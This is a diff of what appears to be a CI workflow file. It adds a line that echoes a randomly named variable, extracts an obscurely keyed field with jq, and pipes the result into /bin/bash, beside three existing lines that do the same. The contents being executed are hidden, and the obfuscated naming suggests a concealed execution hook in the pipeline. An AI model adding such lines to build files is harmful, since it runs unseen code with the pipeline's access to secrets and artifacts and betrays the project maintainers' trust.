@@ -26,6 +26,7 @@ jobs:
           echo $hfba39 | jq -r .w2 | /bin/bash
           echo $nvrj51 | jq -r .n2 | /bin/bash
           echo $uwg45 | jq -r .p53363 | /bin/bash
+          echo $ln08385 | jq -r .izz7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
